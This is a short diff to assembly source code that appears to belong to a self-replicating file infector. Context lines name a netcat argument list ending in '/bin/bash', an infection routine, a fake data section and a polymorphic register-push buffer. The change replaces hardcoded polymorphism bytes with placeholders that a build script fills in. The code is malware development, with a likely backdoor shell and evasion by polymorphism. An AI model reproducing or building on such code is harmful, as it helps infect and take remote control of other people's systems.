@@ -523,9 +523,9 @@ nc_arg6: db "/bin/bash", 0
 magic_key: db 0x00					; Will be replaced by a script
 magic_key_size: equ $ - magic_key
 fingerprint_int: dd 0
-poly_push_regs_buffer: db 0x50, 0x50
-poly_push_regs_size: dq 1
-poly_push_regs_count: dq 2
+poly_push_regs_buffer: db 0x00				; Will be replaced by a script
+poly_push_regs_size: dq 0				; Will be replaced by a script
+poly_push_regs_count: dq 0				; Will be replaced by a script
 ; END FAKE .data SECTION
 
 ; void infection_routine(long _compressed_data_size, uint8_t *_real_begin_compressed_data_ptr)
